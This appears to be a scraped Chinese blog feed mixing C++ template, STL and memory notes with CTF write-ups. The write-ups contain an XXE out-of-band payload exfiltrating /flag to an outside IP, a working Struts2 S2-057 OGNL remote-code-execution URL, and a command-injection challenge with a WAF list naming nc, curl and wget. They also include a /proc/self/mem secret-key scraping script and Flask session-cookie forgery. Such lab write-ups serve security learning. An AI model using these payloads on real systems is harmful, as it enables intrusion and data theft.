\u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;rabbit;\u0026lt;/username\u0026gt;\u0026lt;/user\u0026gt; 响应：\n为什么不行？\n尝试引入服务器外部实体、外带： payload：\n1 2 3 4 5 \u0026lt;!DOCTYPE hacker[ \u0026lt;!ENTITY % file SYSTEM \u0026#34;php://filter/read=convert.base64-encode/resource=/flag\u0026#34;\u0026gt; \u0026lt;!ENTITY % myurl SYSTEM \u0026#34;http://8.137.145.223/evil.dtd\u0026#34;\u0026gt; %myurl; ]\u0026gt; evil.dtd：\n1 2 3 \u0026lt;!ENTITY % wrapper \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; send SYSTEM \u0026#39;http://8.137.145.223/?x=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %wrapper; %send; python3 -m http.server 8000\n测试外网可以正常访问，改包重发：\n还是不行，为什么？\n解决 最后发现问题在于，默认访问的是 80 端口！！！而启动服务器的时候启动了 8000……\n服务器：\nbp:\n终于！！\n一些启示 先搜集信息定方向，然后具体学习相关知识 总是有一些奇怪的错误，定位到知识上去解决，不要乱试 ","date":"2025-10-15T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E9%9B%AA%E7%8E%8B%E7%94%9F%E6%93%92%E6%98%8E%E7%8F%A0%E5%A1%94/","title":"御林招新题：雪王生擒明珠塔"},{"content":"模板 建立通用的模具，提高复用性\n函数模板 作用：\n建立一个通用函数，其函数返回值类型和形参类型可以不具体制定，用一个虚拟的类型来代表。 支持自动类型推导和显式指定类型 1 2 3 4 5 6 7 8 9 //函数模板 template\u0026lt;typenameT\u0026gt;//声明一个模板，告诉编译器后面代码中紧跟着的T不要报错，T是一个通用数据类型 void mySwap(T \u0026amp;a,T \u0026amp;b) { T temp = a; a=b; b = temp; } myswap\u0026lt;int\u0026gt;(a,b) 注意：\n自动类型推导，必须推导出一致的数据类型T，才可以使用 模板必须要确定出 T 的数据类型，才可以使用（不能不推导） 普通函数和模板函数的区别 普通函数调用时可以发生自动类型转换（隐式类型转换） 函数模板调用时，如果利用自动类型推导，不会发生隐式类型转换 调用规则：\n优先调用普通函数 可通过空模板参数列表来强制调用函数模板 函数模板也可以发生重载 如果函数模板可以产生更好的匹配，优先周用函数模板 局限性 需要为特定的类型（如数组、自定义对象等）提供具体化模板\n1 2 3 4 5 6 7 8 9 10 template\u0026lt;\u0026gt;bool myCompare (Person \u0026amp;p1, Person \u0026amp;p2) { if(p1.name == p2.name){ return true; } else { return false; } } 类模板 1 2 teplate\u0026lt;typename T\u0026gt; class ... 与函数模板的区别 没有自动类型推导 可以有默认参数类型 成员函数创建时机 在模板调用（可以确定类型）时，才创建\n类模板对象作参数 指定传入类型 参数模板化 对象中的参数变为模板进行传递 整个类模板化 类模板与继承 类继承的父类是一个类模板时，子类在声明的时候，要指定出父类中T的类型\n若不指定，编译器无法给子类分配内存 如果想灵活指定出父类中T的类型，子类也需变为类模板\n类模板成员的类外实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 //构造函数类外实现 template\u0026lt;class T1,class T2\u0026gt; Person\u0026lt;T1, T2\u0026gt;::Person(T1 name, T2 age) { this-\u0026gt;m_Name = name; this-\u0026gt;m_Age = age; } //成员函数类外实现 template\u0026lt;class T1, class T2\u0026gt; void Person\u0026lt;T1, T2\u0026gt;::showPerson() { } 类模板分文件编写 问题：\n模板中成员函数创建时机是在调用阶段，导致分文件编写时链接不到 解决：\n解决方式1：直接包含.cpp源文件 解决方式2：将声明和实现写到同一个文件中，并更改后缀名为.hpp，hpp是约定的名称，并不是强制 类模板与友元 类内实现：直接在类内声明友元即可\n类外实现：需要提前让编译器知道全局函数的存在\nSTL 初识 Standard Template Library：标准模板库\n主要组件：容器、算法、迭代器 容器和算法通过迭代器连接 STL 采用模板实现 六大组件：容器、算法、迭代器、仿函数、适配器（配接器）、空间配置器\n容器：数据结构 序列式：强调值的排序 关联式：如树，没有严格的物理联系 算法 Algorithms：实现常用算法 质变：与原来不同 非质变：查找、计数、遍历等 迭代器：胶合容器和算法 类似指针，提供访问容器的接口 双向、随机访问 仿函数：行为类似函数，可所谓算法的某种策略 适配器（配接器）：用于修饰容器、算法、迭代器或接口 空间配置器：负责空间的配置和管理 vector 使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;vector\u0026gt; vector\u0026lt;int\u0026gt; v; v.pushback() v.begin(); // 返回迭代器，指向容器中第一个数据 v.end(); // 指向容器最后一个数据的下一个位置 vector\u0026lt;int\u0026gt;::iterator pBegin = v.begin() // 接收 //第一种遍历方式: while (pBegin != pEnd) { cout \u0026lt;\u0026lt; *pBegin \u0026lt;\u0026lt; endl; pBegin++; } //第二种遍历方式: for (vector\u0026lt;int\u0026gt;::iterator it = v.begin(); it != v.end(); it++) { cout \u0026lt;\u0026lt; *it \u0026lt;\u0026lt; endl; } cout \u0026lt;\u0026lt; endl; //第三种遍历方式: //使用STL提供标准遍历算法 头文件 algorithm for_each(v.begin(), v.end(), MyPrint); String string 是 C++ 风格的字符串，本质是一个类\n类内部封装 char*，是管理 char* 的容器 构造函数 1 2 3 4 string();//创建一个空的字符串例如：stringstr; string(const chan* s);//使用字符串s初始化 string(const string\u0026amp; str）;//使用一个string对象初始化另一个string对象 string(Int n, char c);//使用n个字符c初始化 赋值 1 2 3 4 5 6 7 string\u0026amp; operator=(const char*s);//char*类型字符串赋值给当前的字符串 string\u0026amp; operator=(const string \u0026amp;s）;//把字符串s赋给当前的字符串 string\u0026amp; operator=(char c);//字符赋值给当前的字符串 string\u0026amp; assign(const char *s);//把字符串s赋给当前的字符串 string\u0026amp; assign(const char *s,int n);//把字符串s的前n个字符赋给当前的字符串 string\u0026amp; assign(const string \u0026amp;s);//把字符串s赋给当前字符串 string\u0026amp; assign(int n,char c);//用n个字符c赋给当前字符串 拼接 1 2 3 4 5 6 7 string\u0026amp; operator+=(const char*str);//重载+=操作符 string\u0026amp; operator+=(const char c);//重载+=操作符 string\u0026amp; operator+=(const string\u0026amp; str);//重载+=操作符 string\u0026amp; appnd(const char *s);//把字符串s连接到当前字符串结尾 string\u0026amp; append(const char *s,int n);//把字符串s的前n个字符连接到当前字符串结尾 string\u0026amp; append(const string \u0026amp;s);//同operator+=(const string\u0026amp;str) string\u0026amp;append(conststring\u0026amp;s，intpos，intn);/字符串s中从pos开始的n个字符连接到字符串结尾 查找、替换 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 查找 str 第一次出现位置，从 pos 开始查找 int find(const string\u0026amp; str, int pos = 0) const; // 查找 s 第一次出现位置，从 pos 开始查找 int find(const char* s, int pos = 0) const; // 从 pos 位置查找 s 的前 n 个字符第一次位置 int find(const char* s, int pos, int n) const; // 查找字符 c 第一次出现位置 int find(const char c, int pos = 0) const; // 查找 str 最后一次位置，从 pos 开始查找 int rfind(const string\u0026amp; str, int pos = npos) const; // 查找 s 最后一次出现位置，从 pos 开始查找 int rfind(const char* s, int pos = npos) const; // 从 pos 查找 s 的前 n 个字符最后一次位置 int rfind(const char* s, int pos, int n) const; // 查找字符 c 最后一次出现位置 int rfind(const char c, int pos = 0) const; // 替换从 pos 开始 n 个字符为字符串 str string\u0026amp; replace(int pos, int n, const string\u0026amp; str); // 替换从 pos 开始的 n 个字符为字符串 s string\u0026amp; replace(int pos, int n, const char* s); 比较 1 2 int compare(const string\u0026amp; s)const; //与字符串s比较 int compare(const char *s) const;//与字符串s比较 字符存取 1 2 char\u0026amp; operator[] (int n);//通过[方式取字符 char\u0026amp; at(int n);//通过at方法获取字符 插入、删除 1 2 3 4 string\u0026amp; insert(int pos, const char*s);//插入字符串 string\u0026amp; insert(int pos,const string\u0026amp; str);//插入字符串 string\u0026amp; insert(int pos,int n,char c);//在指定位置插入n个字符c string\u0026amp; erase(int pos,int n = npos);//删除从Pos开始的n个字符 截取 1 string substr(int pos=θ,int = npos)const; vector 据结构和数组非常相似，也称为单端数组\n数组是静态空间，而 vector 可以动态扩展 动态扩展：不是在原空间之后续接新空间，而是找更大的内存空间，然后将原数据拷贝新空间，释放原空间 构造 1 2 3 4 vector\u0026lt;T\u0026gt;v;//采用模板实现类实现，默认构造函数 vector(v.begin(),v.end());//将v[begin(),end()区间中的元素拷贝给本身。 vector(n,elem);//构造函数将n个elem拷贝给本身。 vector(const vector \u0026amp;vec);//拷贝构造函数。 赋值 1 2 3 vector\u0026amp; operator=(const vector \u0026amp;vec);//重载等号操作符 assign(beg,end);//将[beg，end)区间中的数据拷贝赋值给本身。 assign(n,elem);//将n个elem拷贝赋值给本身。 容量 1 2 3 4 5 6 7 empty();//判断容器是否为空 capacity();//容器的容量 size();//返回容器中元素的个数 resize(int num);//重新指定容器的长度为num，若容器变长，则以默认值填充新位置。 //如果容器变短，则末尾超出容器长度的元素被删除。 resize（intnum，elem)；//重新指定容器的长度为num，若容器变长，则以elem值填充新位置。 //如果容器变短，则末尾超出容器长度的元素被删除 插入、删除 1 2 3 4 5 6 7 push_back(ele);//尾部插入元素ele pop_back();//删除最后一个元素 insert(const_iterator pos,ele);//选代器指向位置pos插入元素ele insert(const_iteratorpos，intcount，ele);//迭代器指向位置pos插入count个元素ele erase(const_iterator pos);//删除选代器指向的元素 erase(const_iteratorstart，const_iteratorend);//删除迭代器从start到end之间的元素 clear();//删除容器中所有元素 存取 1 2 3 4 at(int idx);//返回索引lidx所指的数据 operator[];//返回索引lidx所指的数据 front();//返回容器中第一个数据元素 back();//返回容器中最后一个数据元素 呼唤 swap(vec)\n收缩空间：vector\u0026lt;int\u0026gt;(v).swap(v)\n匿名对象自动被回收 预留空间 reserve(int len)\n分配内存，但内存上数据并未初始化，不可访问 用于减少开辟空间次数 ","date":"2025-10-14T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-c++%E6%B3%9B%E5%9E%8B%E7%BC%96%E7%A8%8B%E5%8F%8Astl%E6%8A%80%E6%9C%AF/","title":"C++ 模板及STL技术"},{"content":"题干 附件：\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 version: \u0026#39;3.8\u0026#39; services: ipv4-challenge-challenge: build: . ports: - \u0026#34;5000:5000\u0026#34; volumes: - ./server.py:/app/server.py environment: - PYTHONUNBUFFERED=1 restart: always networks: default: driver: bridge dockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 FROM python:3.9-alpine RUN apk add --no-cache bash procps RUN rm -f /bin/cat /bin/ls /usr/bin/cat /usr/bin/ls /usr/bin/nc /usr/bin/curl /usr/bin/wget /usr/bin/id /usr/bin/whoami WORKDIR /app COPY server.py . COPY templates ./templates COPY flag.txt /flag RUN pip install Flask EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;server.py\u0026#34;] server.py: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 app = Flask(__name__, template_folder=\u0026#39;templates\u0026#39;) app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;xxxxxxx\u0026#39; USERS = {} def waf_filter(data): malicious_keywords = [ \u0026#39;cat\u0026#39;, \u0026#39;ls\u0026#39;, \u0026#39;id\u0026#39;, \u0026#39;whoami\u0026#39;, \u0026#39;pwd\u0026#39;, \u0026#39;nc\u0026#39;, \u0026#39;curl\u0026#39;, \u0026#39;wget\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;||\u0026#39;, \u0026#39;\u0026amp;\u0026amp;\u0026#39; ] for keyword in malicious_keywords: if keyword in data: return True return False # 登录逻辑 @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form.get(\u0026#39;username\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) user_info = USERS.get(username) if user_info and user_info[\u0026#39;password\u0026#39;] == password: user_data = {\u0026#34;username\u0026#34;: username, \u0026#34;is_admin\u0026#34;: user_info[\u0026#39;is_admin\u0026#39;]} session[\u0026#39;user\u0026#39;] = base64.b64encode(json.dumps(user_data).encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;) return redirect(url_for(\u0026#39;user_home\u0026#39;)) return render_template(\u0026#39;login.html\u0026#39;, message=\u0026#34;登录失败，用户名或密码错误。\u0026#34;) return render_template(\u0026#39;login.html\u0026#39;) ...... # ping 逻辑 @app.route(\u0026#39;/ping\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def ping_page(): if \u0026#39;user\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) try: user_data = json.loads(base64.b64decode(session[\u0026#39;user\u0026#39;]).decode(\u0026#39;utf-8\u0026#39;)) if not user_data.get(\u0026#39;is_admin\u0026#39;): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;对不起，只有管理员才能使用这个功能。\u0026#34;) except Exception: return redirect(url_for(\u0026#39;logout\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: ip_base64 = request.form.get(\u0026#39;ip_base64\u0026#39;, \u0026#39;\u0026#39;) if not ip_base64: return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;请提供 IP 地址。\u0026#34;) try: decoded_ip = base64.b64decode(ip_base64.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;) if waf_filter(urllib.parse.unquote(ip_base64)): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;WAF: 检测到恶意关键字，请求被阻止。\u0026#34;) if not re.match(r\u0026#39;^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$\u0026#39;, decoded_ip.split(\u0026#39;\\n\u0026#39;)[0]): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：IP 地址格式不正确\u0026#34;) if not all(0 \u0026lt;= int(part) \u0026lt; 256 for part in decoded_ip.split(\u0026#39;.\u0026#39;)): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：IP 地址格式不正确\u0026#34;) if not ipaddress.ip_address(decoded_ip): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：IP 地址格式不正确\u0026#34;) except Exception: return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：无效的 Base64 编码或 IP 格式错误。\u0026#34;) command = f\u0026#34;echo \\\u0026#34;ping -c 1 $(echo \u0026#39;{ip_base64}\u0026#39; | base64 -d)\\\u0026#34; | sh\u0026#34; try: process = subprocess.run( command, shell=True, check=True, capture_output=True, text=True, timeout=5, executable=\u0026#34;/bin/sh\u0026#34; ) return render_template(\u0026#39;ping.html\u0026#39;, output=process.stdout) except subprocess.TimeoutExpired: return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;❌ Ping 操作超时，请重试或检查网络连接。\u0026#34;) except subprocess.CalledProcessError as e: return render_template(\u0026#39;ping.html\u0026#39;, message=f\u0026#34;命令执行失败：{e.stderr}\u0026#34;) except Exception as e: return render_template(\u0026#39;ping.html\u0026#39;, message=f\u0026#34;发生未知错误：{e}\u0026#34;) return render_template(\u0026#39;ping.html\u0026#39;) templates 各个 html 文件 尝试 1 2 D:\\software\\tools\\flask-session-cookie-manager-1.2.2\u0026gt;python flask_session_cookie_manager2.py encode -s \u0026#34;xxxxxxx\u0026#34; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;is_admin\u0026#39;:\u0026#39;true\u0026#39;}\u0026#34; eyJpc19hZG1pbiI6eyIgYiI6ImRISjFaUT09In0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.aPCvLQ.2wnGTmxlNZK2w-jaIbz3fvYdfIs ","date":"2025-10-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-ipv4/","title":"御林招新题：ipv4"},{"content":"题干 目标一：云端之门的低语 （ Spring Cloud Gateway 3.1.0）\n“天穹”微服务 API 网关：这是公司最新潮的 API 网关，所有数据的流量中枢，看起来坚不可摧。然而，根据情报，这个版本的网关在处理路由请求时，似乎留下了一道不易察觉的缝隙。\n目标二：思想者的诡计 （ThinkPHP 5.0.23）\n“敏捷开发” PHP 门户:这是用一款广受欢迎的 PHP 框架搭建的门户网站，以其高效和灵活著称。然而，在处理 HTTP 请求的某个环节，框架对“请求方法”的理解出现了偏差。\n目标三：远古框架的咆哮 （ Struts 2.3.34）\n“化石”级企业管理平台：这是一个老旧的 Java 企业级应用，虽然年迈，但依然在核心业务线上运行。它的开发者在配置某个核心组件时，遵循了当时流行的“通配符”设计哲学，却忽略了这份“灵活”背后潜藏的巨大风险。\n解题过程 Spring Cloud Gateway 3.1.0 直接脚本过了\nThinkPHP 5.0.23 也是脚本\nStruts 2.3.34 这个脚本不知道怎么用\n于是尝试解题：\n打开网站发现是空白的，扫描工具扫到 /upload.action，进入 是 struts2，网上查询，发现 S2-057远程执行代码漏洞（CVE-2018-11776） 影响当前版本 参考 Struts2 S2-057远程执行代码漏洞（CVE-2018-11776）_apache struts 2 安全漏洞(cve-2018-11776)-CSDN博客\n区别在于上面靶场的网址是 /showcase\n漏洞判断 poc 1 2 ${ (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\u0026#39;struts.valueStack\u0026#39;].context).(#cr=#ct[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(\u0026#39;id\u0026#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))} 注意：poc 放到网址上，需要 url 编码。后续又发现，“ls /”这一字符串中空格需要编码，但是斜杠不需要编码！..也不需要编码\n最终 payload： 1 payload：/upload.action/$%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/flag%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action ","date":"2025-10-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/","title":"御林招新题：档案馆的回响"},{"content":"题目描述 御林娘图片_御林娘素材_御林娘高清图片_御林网图片下载_306万 御林娘 免版税图片、库存照片和图像 | Yulinsec\n御林娘小时候上网找素材做海报，意外发现了一个用python编写的盗版图片网站。她一顿操作猛如虎，行云流水地黑入网站获取管理员权限，狠狠报复了这个盗版网站。\n1 2 3 4 5 \u0026lt;h1\u0026gt;御林图库\u0026lt;/h1\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/download?file=pic1.png\u0026#34;\u0026gt;扣1送御林娘自拍\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/download?file=pic2.png\u0026#34;\u0026gt;简约大气的御林娘图片-御林娘图片素材免费下载\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; 解题 思路 信息搜集：\n题目告知是 python 写的网站 页面给了链接，可能存在文件泄露！ 尝试下载文件，发现：/download?file=../app.py，于是得到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 from flask import Flask, request, session, render_template_string, abort, redirect, url_for, make_response, Response import ... app = Flask(__name__) def generate_secret_key(): prefix = \u0026#34;Yulin\u0026#34; suffix = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) return prefix + suffix app.secret_key = generate_secret_key() flag = \u0026#34;\u0026#34; if os.path.isfile(\u0026#34;/flag\u0026#34;): with open(\u0026#34;/flag\u0026#34;, \u0026#34;r\u0026#34;) as f: flag = f.read().strip() os.remove(\u0026#34;/flag\u0026#34;) os.remove(\u0026#34;/start.sh\u0026#34;) else: flag = \u0026#34;[ ]\u0026#34; @app.route(\u0026#39;/\u0026#39;) def index(): if session.get(\u0026#39;is_admin\u0026#39;): return f\u0026#39;\u0026lt;h1\u0026gt;你好，Admin\u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt;Flag: YulinSec{{{flag}}}\u0026lt;/p\u0026gt;\u0026#39; return ...... @app.route(\u0026#39;/download\u0026#39;) def download(): ...... allowed_proc_files = [\u0026#39;/proc/self/maps\u0026#39;, \u0026#39;/proc/self/mem\u0026#39;] if file_path in allowed_proc_files: pass else: ...... if file_path == \u0026#39;/proc/self/maps\u0026#39;: try: with open(file_path, \u0026#39;r\u0026#39;) as f: content = f.read() ... return response except Exception as e: ... if file_path == \u0026#39;/proc/self/mem\u0026#39;: if end \u0026lt;= start: end = start + 1048576 # 1MB def generate(): try: with open(file_path, \u0026#39;rb\u0026#39;) as f: f.seek(start) remaining = end - start while remaining \u0026gt; 0: chunk_size = min(1024 * 1024, remaining) # 每次最多读取1MB data = f.read(chunk_size) if not data: break yield data remaining -= len(data) except Exception as e: app.logger.error(f\u0026#34;Error reading memory: {str(e)}\u0026#34;) yield f\u0026#34;Error reading memory content from {start} to {end}\u0026#34;.encode() return Response( generate(), mimetype=\u0026#39;application/octet-stream\u0026#39;, headers={\u0026#39;Content-Disposition\u0026#39;: f\u0026#39;attachment; filename=memory_{start}_{end}.bin\u0026#39;} ) try: with open(file_path, \u0026#39;rb\u0026#39;) as f: content = f.read() except Exception as e: ... sanitized_content = re.sub( rb\u0026#39;flag\\{.*?\\}\u0026#39;, b\u0026#39;[ ]\u0026#39;, content, flags=re.IGNORECASE ) .... return response if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 代码关键点：\n泄露了文件 /proc/self/maps 以及 /proc/self/mem\n限制了 mem 的读取，一次只能读 1 MB\n突破点在于取得 session 的 admin\n尝试 读取 maps：\n1 2 3 4 5 6 7 5e2267a76000-5e2267a77000 r--p 00000000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a77000-5e2267a78000 r-xp 00001000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a78000-5e2267a79000 r--p 00002000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a79000-5e2267a7a000 r--p 00002000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a7a000-5e2267a7b000 rw-p 00003000 00:aa6 1871870 /usr/local/bin/python3.8 ...... 权限：如 r--p、r-xp、rw-p 等，r 表示可读（read）、w 表示可写（write）、x 表示可执行（execute）、p 表示私有（private，即进程间不共享）。 由于数据段通常是可读可写的，所以考虑遍历读取 rw 的区域，编写脚本\n写脚本 不会写，问 AI\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 import requests import re def get_memory_regions(target): \u0026#34;\u0026#34;\u0026#34;获取可读写的匿名内存区域\u0026#34;\u0026#34;\u0026#34; try: response = requests.get(f\u0026#34;{target}/download?file=/proc/self/maps\u0026#34;, timeout=10) regions = [] for line in response.text.splitlines(): # 筛选包含Python字符串的内存区域特征 # 注意，由 rw-p 改为 rw,删去and if \u0026#39;rw\u0026#39; in line:# and (\u0026#39;anon_inode\u0026#39; in line or \u0026#39;[heap]\u0026#39; in line): addr_range = line.split()[0] start, end = addr_range.split(\u0026#39;-\u0026#39;) regions.append((int(start, 16), int(end, 16))) return regions except Exception as e: print(f\u0026#34;获取内存映射失败: {e}\u0026#34;) return [] def search_secret_key(target, regions): \u0026#34;\u0026#34;\u0026#34;在指定内存区域搜索secret_key\u0026#34;\u0026#34;\u0026#34; # 匹配模式：Yulin开头 + 16位字母数字 pattern = rb\u0026#39;Yulin[A-Za-z0-9]{16}\u0026#39; for start, end in regions: print(f\u0026#34;扫描内存区域: 0x{start:x} - 0x{end:x}\u0026#34;) # 分块读取（每次1MB，平衡速度和稳定性） chunk_size = 1 * 1024 * 1024 current = start while current \u0026lt; end: chunk_end = min(current + chunk_size, end) try: # 读取内存块 resp = requests.get( f\u0026#34;{target}/download?file=/proc/self/mem\u0026#34;, params={\u0026#39;start\u0026#39;: current, \u0026#39;end\u0026#39;: chunk_end}, timeout=15 ) # 搜索密钥 match = re.search(pattern, resp.content) if match: return match.group(0).decode() current = chunk_end print(f\u0026#34;已扫描: {int((current - start)/(end - start)*100)}%\u0026#34;, end=\u0026#39;\\r\u0026#39;) except Exception as e: print(f\u0026#34;\\n读取内存块失败(0x{current:x}): {e}\u0026#34;) current += chunk_size # 跳过错误块 return None def main(): target = \u0026#34;http://prob01-4a2b75818e1a60809324fca5d9adda1a.recruit.yulinsec.cn\u0026#34; print(f\u0026#34;目标地址: {target}\u0026#34;) # 获取内存区域 regions = get_memory_regions(target) if not regions: print(\u0026#34;未找到可扫描的内存区域\u0026#34;) return print(f\u0026#34;发现 {len(regions)} 个可扫描内存区域\u0026#34;) # 搜索secret_key secret_key = search_secret_key(target, regions) if secret_key: print(f\u0026#34;\\n找到secret_key: {secret_key}\u0026#34;) else: print(\u0026#34;\\n未找到secret_key，请尝试重新运行\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() 主要是 request 库还是不熟，还有 re 正则匹配、字符串处理。\n先这样吧。\n得到 secret_key：xxxx\n漏洞利用 得到了 key 以后，抓包发现文件头中并不包含 Cookie！\n考虑自己构造，发送 于是使用 flask-session-cookie-manager 来构造\n还顺便配置了 py2、py3\n1 2 3 D:\\software\\tools\\flask-session-cookie-manager-1.2.2\u0026gt;python .\\flask_session_cookie_manager2.py encode -s \u0026#34;Yulin9IlwFlKE3K6ubjNn\u0026#34; -t \u0026#34;{\u0026#39;is_admin\u0026#39;:\u0026#39;true\u0026#39;}\u0026#34; eyJpc19hZG1pbiI6eyIgYiI6ImRISjFaUT09In19.aO5EQg.kmSLHAE42MX1z895x02HEdD8zqg 这里要注意的是 true 也要用分号包围……\n放到 bp，完成！\n","date":"2025-10-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E5%BE%A1%E5%9B%BE%E7%BD%91/","title":"御林招新题：御图网"},{"content":"内存分区模型 程序运行前 编译后生成 exe 可执行程序，分为两个区域\n代码区：\n存放CPU执行的机器指令 代码区是共享的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可 代码区是只读的，使其只读的原因是防止程序意外地修改了它的指令 全局区：\n全局变量和静态变量存放在此 局部变量（即使用 const 修饰）不在全局区中 全局区还包含了常量区，字符串常量和其他常量也存放在此 const 修饰的全局常量、字符串常量 该区域的数据在程序结束后由操作系统释放 程序运行后 栈区：\n由编译器自动分配释放，存放函数的参数值，局部变量等 注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放（如函数的形参、局部变量） 堆区：\n由程序员分配释放，若程序员不释放，程序结束时由操作系统回收 在 C++ 中主要利用 new 在堆区开辟内存 1 2 3 4 5 6 7 int * func () { //利用new关键字可以将数据开辟到堆区 //指针本质也是局部变量，放在栈上，指针保存的数据是放在堆区 int * p=newint(10) ; return p; } new 操作符 C++中利用new操作符在堆区开辟数据\n堆区开辟的数据，由程序员手动开辟，手动释放，释放利用操作符delete\ndelete 对应指针 利用new创建的数据，会返回该数据对应的类型的指针\n1 2 3 4 // 创建数组 int* a = new int(length); //释放数组的时候要加[]才可以,指明一段内存空间 delete[] arr; 引用 给变量起别名\n变量的含义：用于指代，操作某块内存 1 2 // 语法：数据类型\u0026amp;别名=原名 int \u0026amp;b = a; 注意事项 引用必须初始化 初始化后不可再改变 引用做函数参数 作用：函数传参时，可以利用引用的技术让形参修饰实参\n优点：可以简化指针修改实参\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //1.值传递 void mySwap01（int a,int b）{ int temp=a; a = b b = temp; } //2.地址传递 void mySwapθ2（int *a,int *b）{ int temp*a; *b; *b=temp; } //3.引用传递,别名和本名可以相同 void mySwap03（int \u0026amp;a，int \u0026amp;b）{ int temp =a; a = b b = temp; } 引用做返回值 注意：不要返回局部变量引用\n用法：函数调用作为左值\n1 2 3 4 5 6 